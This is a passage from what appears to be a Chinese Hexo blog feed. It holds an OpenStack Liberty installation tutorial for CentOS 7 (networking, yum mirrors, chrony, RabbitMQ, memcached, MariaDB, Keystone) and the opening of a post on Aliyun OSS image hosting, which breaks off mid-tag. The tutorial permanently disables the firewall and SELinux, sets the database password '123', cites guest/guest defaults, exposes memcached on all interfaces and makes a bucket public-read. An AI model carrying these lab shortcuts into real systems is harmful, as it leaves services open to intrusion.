id="修改网卡">修改网卡</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth0<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110143231171.png" alt="image-20250110143231171"></p><p>第二块网卡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/sysconfig/network-scripts/ifcfg-eth1<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110143308094.png" alt="image-20250110143308094"></p><p>重启网卡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl restart network<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110103137641.png" alt="image-20250110103137641"></p><h3 id="创建ssh连接-2">创建ssh连接</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#更改默认配置文件。</span><br>vi /etc/ssh/sshd_config<br><span class="hljs-comment">#重启sshd服务，使配置生效。</span><br>service sshd restart<br><span class="hljs-comment">#开启防火墙端口</span><br>firewall-cmd --zone=public --add-port=22/tcp --permanent<br></code></pre></td></tr></table></figure><p>这样就能使用工具连接ssh了。</p><h3 id="设置hosts文件-2">设置hosts文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/hosts<br></code></pre></td></tr></table></figure><p>添加如下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.146.150 controller<br></code></pre></td></tr></table></figure><h2 id="yum换源">yum换源</h2><p>删除系统自带yum所有源配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -f /etc/yum.repos.d/*<br></code></pre></td></tr></table></figure><p>获取阿里源的配置文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo<br></code></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># CentOS-Base.repo</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><br><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="hljs-comment"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="hljs-comment"># unless you are manually picking other mirrors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="hljs-comment"># remarked out baseurl= line instead.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br> <br>[base]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Base - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/os/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Updates - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/updates/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Extras - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/extras/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Plus - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/centosplus/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>enabled=0<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#contrib - packages by Centos Users</span><br>[contrib]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Contrib - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http://mirrors.aliyun.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>        http://mirrors.cloud.aliyuncs.com/centos/<span class="hljs-variable">$releasever</span>/contrib/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>enabled=0<br>gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7<br></code></pre></td></tr></table></figure><p>清理yum缓存，并生成新的缓存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum clean all<br>yum makecache<br></code></pre></td></tr></table></figure><p>更新yum源检查是否生效</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y update<br></code></pre></td></tr></table></figure><h2 id="时间同步">时间同步</h2><h3 id="控制节点">控制节点</h3><p>下载安装chrony</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install chrony<br></code></pre></td></tr></table></figure><p>修改配置文件/etc/chrony.conf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/chrony.conf<br></code></pre></td></tr></table></figure><p>添加<code>server NTP_SERVER iburst</code>，将<code>NTP_SERVERNTP_SERVER</code>替换成<code>time1.aliyun.com</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">server time1.aliyun.com iburst<br><span class="hljs-comment">#修改allow</span><br>allow 192.168.146.0/24<br></code></pre></td></tr></table></figure><p>保存并退出后，输入如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#启动并加入开机自启</span><br>systemctl <span class="hljs-built_in">enable</span> chronyd.service<br>systemctl start chronyd.service<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215300673.png" alt="image-20250113215300673"></p><h3 id="计算节点">计算节点</h3><p>下载安装chrony</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install chrony<br></code></pre></td></tr></table></figure><p>修改配置文件/etc/chrony.conf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vi /etc/chrony.conf<br></code></pre></td></tr></table></figure><p>编辑<code>/etc/chrony.conf</code> 文件并注释除<code>server</code> 值外的所有内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">server controller iburst<br></code></pre></td></tr></table></figure><p>保存并退出后输入如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#启动并加入开机自启</span><br>systemctl <span class="hljs-built_in">enable</span> chronyd.service<br>systemctl start chronyd.service<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110155143151.png" alt="image-20250110155143151"></p><h3 id="验证操作">验证操作</h3><p>输入命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chronyc sources<br></code></pre></td></tr></table></figure><p>控制节点将显示</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215341470.png" alt="image-20250113215341470"></p><p>计算节点将显示</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250113215405852.png" alt="image-20250113215405852"></p><h2 id="安装通用软件包">安装通用软件包</h2><p>计算节点和控制节点都要进行如下操作。</p><p>先禁用防火墙和selinux(永久禁用)。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl stop firewalld<br>systemctl <span class="hljs-built_in">disable</span> firewalld<br>setenforce 0<br>getenforce<br>vi /etc/selinux/config<br></code></pre></td></tr></table></figure><p>编辑配置文件如下所示：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250110165646713.png" alt="image-20250110165646713"></p><h3 id="OpenStack包">OpenStack包</h3><p>在CentOS中， extras仓库提供用于启用 OpenStack 仓库的RPM包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 安装用于启用OpenStack仓库的包。</span><br>yum install -y https://buildlogs.centos.org/centos/7/cloud/x86_64/openstack-liberty/centos-release-openstack-liberty-1-3.el7.noarch.rpm<br><span class="hljs-comment"># 安装 centos-release-openstack-liberty</span><br>yum install -y centos-release-openstack-liberty<br><span class="hljs-comment">#在主机上升级包</span><br>yum -y upgrade<br><span class="hljs-comment"># 安装 OpenStack 客户端</span><br>yum install -y python-openstackclient<br><span class="hljs-comment"># RHEL和 CentOS 默认启用 SELinux 。安装 openstack-selinux 包实现对OpenStack服务的安全策略进行自动管理</span><br>yum install -y openstack-selinux<br></code></pre></td></tr></table></figure><h3 id="安装rabbitmq消息队列">安装rabbitmq消息队列</h3><p>安装包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y rabbitmq-server<br></code></pre></td></tr></table></figure><p>启动消息队列服务并将其配置为随系统启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> rabbitmq-server.service<br>systemctl start rabbitmq-server.service<br></code></pre></td></tr></table></figure><p>验证端口是否存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -lntp|grep 5672<br></code></pre></td></tr></table></figure><p>添加 <code>openstack</code> 用户：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmqctl add_user openstack RABBIT_PASS<br></code></pre></td></tr></table></figure><p>用合适的密码替换 <code>RABBIT_DBPASS</code>。</p><p>给<code>openstack</code>用户配置写和读权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmqctl set_permissions openstack <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span><br></code></pre></td></tr></table></figure><p>安装监控插件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmq-plugins <span class="hljs-built_in">enable</span> rabbitmq_management<br></code></pre></td></tr></table></figure><p>检查端口查看是否开启</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -tnulp|grep 15672<br></code></pre></td></tr></table></figure><p>开启之后可以访问rabbitmq web管理界面<a href="http://192.168.146.150:15672">http://192.168.146.150:15672</a>.</p><p>默认用户名:<code>guest</code> 默认密码:<code>guest</code></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250114164646844.png" alt="image-20250114164646844"></p><h3 id="安装memcached缓存token">安装memcached缓存token</h3><p>下载安装软件包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y memcached python-memcached<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#127.0.0.1 都替换为 0.0.0.0</span><br>sed -i <span class="hljs-string">&#x27;s#127.0.0.1#0.0.0.0#g&#x27;</span> /etc/sysconfig/memcached<br><span class="hljs-comment">#启动并加入开机自启</span><br>systemctl <span class="hljs-built_in">enable</span> memcached.service<br>systemctl start memcached.service<br></code></pre></td></tr></table></figure><h2 id="SQL数据库">SQL数据库</h2><p>控制节点安装软件包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y mariadb mariadb-server MySQL-python<br></code></pre></td></tr></table></figure><p>创建并编辑 <code>/etc/mysql/conf.d/mariadb_openstack.cnf</code>，然后在 <code>[mysqld]</code> 部分，设置 <code>bind-address</code>值为控制节点的管理网络IP地址以使得其它节点可以通过管理网络访问数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs config">[mysqld]<br>bind-address = 192.168.146.200<br>default-storage-engine = innodb<br>innodb_file_per_table = on<br>collation-server = utf8_general_ci<br>max_connections = 4096<br>init-connect = &#x27;SET NAMES utf8&#x27;<br>character-set-server = utf8<br></code></pre></td></tr></table></figure><p>启动数据库服务，并将其配置为开机自启：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> mariadb.service<br>systemctl start mariadb.service<br><span class="hljs-comment">#查看端口验证</span><br>netstat -tnulp|grep 3306<br></code></pre></td></tr></table></figure><p>执行脚本来对数据库进行安全加固。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#跳坑</span><br>mysql_secure_installation<br><span class="hljs-comment">#输入回车-Y-输入密码-Y-Y-Y-Y</span><br></code></pre></td></tr></table></figure><h2 id="安装和配置OpenStack身份认证服务">安装和配置OpenStack身份认证服务</h2><p>该部分控制节点配置即可。</p><h3 id="前提条件">前提条件</h3><p>在你配置 OpenStack 身份认证服务前，你必须创建一个数据库和管理员令牌。</p><p>完成下面的步骤以创建数据库：</p><ul><li><p>用数据库连接客户端以 <code>root</code> 用户连接到数据库服务器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">mysql -u root -p<br></code></pre></td></tr></table></figure><p>随后输入密码进入数据库。</p></li><li><p>创建 <code>keystone</code> 数据库：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> keystone;<br></code></pre></td></tr></table></figure></li><li><p>对<code>keystone</code>数据库授予恰当的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;localhost&#x27; \<br>  IDENTIFIED BY &#x27;123&#x27;;<br>GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;%&#x27; \<br>  IDENTIFIED BY &#x27;123&#x27;;<br></code></pre></td></tr></table></figure><p>用合适的密码替换 <code>KEYSTONE_DBPASS</code> 。</p></li><li><p>退出数据库客户端。</p></li></ul><p>生成一个随机值在初始的配置中作为管理员的令牌。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">openssl rand -hex 10<br></code></pre></td></tr></table></figure><h3 id="安装并配置组件">安装并配置组件</h3><p>运行以下命令来安装包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y openstack-keystone httpd mod_wsgi \<br>  memcached python-memcached<br></code></pre></td></tr></table></figure><p>启动Memcached服务，并且配置它随机启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> memcached.service<br>systemctl start memcached.service<br></code></pre></td></tr></table></figure><p>编辑文件 <code>/etc/keystone/keystone.conf</code> 并完成如下动作：</p><ul><li><p>在<code>[DEFAULT]</code>部分，定义管理员token初始值：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[DEFAULT]<br>...<br>admin_token = ADMIN_TOKEN<br></code></pre></td></tr></table></figure><p>用你在前一步生成的随机数替换 <code>ADMIN_TOKEN</code> 。</p></li><li><p>在 <code>[database]</code> 部分，配置数据库访问：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[database]<br>...<br>connection = mysql://keystone:KEYSTONE_DBPASS@controller/keystone<br></code></pre></td></tr></table></figure><p>将 <code>KEYSTONE_DBPASS</code> 替换为你为数据库选择的密码。</p></li><li><p>在<code>[memcache]</code> 部分，配置Memcached服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[memcache]<br>...<br>servers = localhost:11211<br></code></pre></td></tr></table></figure></li><li><p>在<code>[token]</code> 部分，配置 UUID token provider 和Memcached 驱动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">[token]<br>...<br>provider = uuid<br>driver = memcache<br></code></pre></td></tr></table></figure></li><li><p>在 <code>[revoke]</code> 部分，配置SQL 回滚驱动:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[revoke]<br>...<br>driver = sql<br></code></pre></td></tr></table></figure></li><li><p>（可选的）为帮助排错，在 “[DEFAULT]”部分启用详细日志。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[DEFAULT]<br>...<br>verbose = True<br></code></pre></td></tr></table></figure></li></ul><p>初始化身份认证服务的数据库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">su -s /bin/sh -c <span class="hljs-string">&quot;keystone-manage db_sync&quot;</span> keystone<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>openstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次博客更新</title>
    <link href="/2024/12/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
    <url>/2024/12/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/</url>
    
    <content type="html"><![CDATA[<p>因为一直以来我的博客都存在一些小问题，解决了一些之后没有进行记录，今天摸鱼实在是太无聊了，加上有个很恶心的bug困扰了我很久，故记录一下。</p><span id="more"></span><h1 id="标记不显示">标记不显示</h1><p>在markdown中编写的偶尔有 <mark>注意</mark> 这类标记，格式为==标记==。但是在markdown中正常显示的标记，在博客里居然不显示了。</p><p>这个问题很好解决，博客之前因为需要使用数学公式，故将渲染器从marked更换为了markdown-it，markdown-it有支持标记的默认插件，但是要在hexo的_config.yml中进行如下设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">markdown:</span><br>  <span class="hljs-attr">preset:</span> <span class="hljs-string">&quot;default&quot;</span><br>  <span class="hljs-attr">render:</span><br>    <span class="hljs-attr">html:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">xhtmlOut:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">langPrefix:</span> <span class="hljs-string">&quot;language-&quot;</span><br>    <span class="hljs-attr">breaks:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">linkify:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">typographer:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">quotes:</span> <span class="hljs-string">&quot;“”‘’&quot;</span><br>  <span class="hljs-attr">enable_rules:</span><br>  <span class="hljs-attr">disable_rules:</span><br>  <span class="hljs-attr">plugins:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-abbr</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-cjk-breaks</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-deflist</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-emoji</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-footnote</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-ins</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-mark</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sup</span><br>  <span class="hljs-attr">anchors:</span><br>    <span class="hljs-attr">level:</span> <span class="hljs-number">2</span><br>    <span class="hljs-attr">collisionSuffix:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attr">permalink:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">permalinkClass:</span> <span class="hljs-string">&quot;header-anchor&quot;</span><br>    <span class="hljs-attr">permalinkSide:</span> <span class="hljs-string">&quot;left&quot;</span><br>    <span class="hljs-attr">permalinkSymbol:</span> <span class="hljs-string">&quot;¶&quot;</span><br>    <span class="hljs-attr">case:</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">separator:</span> <span class="hljs-string">&quot;-&quot;</span><br></code></pre></td></tr></table></figure><p>markdown-it-mark就是显示标记的插件了。</p><h1 id="markdown使用阿里云oss上传图片">markdown使用阿里云oss上传图片</h1><p>我之前没有使用图片懒加载之类的优化方案，每次登录网站都巨卡无比，图片加载的很慢，让我很不爽，特别是跟某人的一对比就更不爽了（我俩都没优化，但是他一瞬间就加载好了）。</p><p>在多次搜索下，终于发现了一个方案，那就是把图片直接在粘贴的时候就上传到网上。由于其他免费的厂商我不太放心，因此这里选用阿里云的对象存储oss。</p><p>产品这里选择对象存储oss</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210154112650.png" alt="image-20241210154112650"></p><p>选个标准存储包，一年只需要9块</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210154719330.png" alt="image-20241210154719330"></p><blockquote><p>注意这里购买的对象存储只是存储，上传的流量费用还是需要出的，但是很便宜，个人使用一个月几毛钱都没有，往账户里充十块钱让它扣就行。</p></blockquote><p>之后来到控制台——菜单——对象存储</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160102162.png" alt="image-20241210160102162"></p><p>选择创建Bucket</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160124499.png" alt="image-20241210160124499"></p><p>名字随便起一个，选择本地冗余存储。这里改不了公共访问控制和读写权限，因此直接点完成创建就好了。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160502926.png" alt="image-20241210160502926"></p><p>创建完成之后来到创建的bucket中，点击文件列表，新建一个目录，起一个名字</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210162526938.png" alt="image-20241210162526938"></p><p>回到bucket概览，选择前往编辑。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160649674.png" alt="image-20241210160649674"></p><p>将阻止公共访问给关了，然后来到读写权限，设置为公共读。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160729661.png" alt="image-20241210160729661"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160758349.png" alt="image-20241210160758349"></p><p>进入RAM访问控制，选择用户并且创建一个用户</p><p><img 